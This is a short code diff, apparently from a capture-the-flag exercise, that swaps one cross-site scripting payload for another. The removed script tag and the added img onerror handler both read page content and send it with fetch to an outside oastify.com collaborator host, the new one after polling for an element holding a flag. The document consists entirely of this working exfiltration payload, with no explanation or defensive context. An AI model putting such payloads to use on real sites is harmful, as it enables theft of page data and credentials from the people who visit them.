@@ -1,3 +1,15 @@
-<script>
-fetch("https://aes3gjnm07xogw2a8thgxu788zeq2hu5j.oastify.com?flag=" + document.body.innerText)
-</script>
+<img src=x onerror="
+  (function(){
+    // Wait until the flag element exists
+    let tries = 0;
+    let interval = setInterval(()=>{
+      const flag = document.getElementById('flagText');
+      if(flag){
+        // Send flag to OAST/Collaborator server
+        fetch('https://el37nnuq7b4sn09efxok4yecf3lu9l29r.oastify.com/?flag='+encodeURIComponent(flag.textContent));
+        clearInterval(interval);
+      }
+      if(++tries > 20) clearInterval(interval);
+    }, 500);
+  })();
+">
